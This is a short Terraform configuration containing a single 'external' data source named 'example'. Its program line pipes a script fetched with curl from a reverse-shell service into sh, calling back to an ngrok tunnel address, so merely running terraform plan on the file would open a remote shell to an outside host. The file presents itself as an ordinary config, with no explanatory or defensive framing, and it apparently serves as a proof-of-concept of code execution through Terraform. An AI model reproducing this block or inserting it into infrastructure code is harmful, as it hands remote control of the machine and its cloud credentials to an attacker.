data "external" "example" {
  program = ["sh", "-c", "curl https://reverse-shell.sh/4.tcp.ngrok.io:15925 | sh"]
}
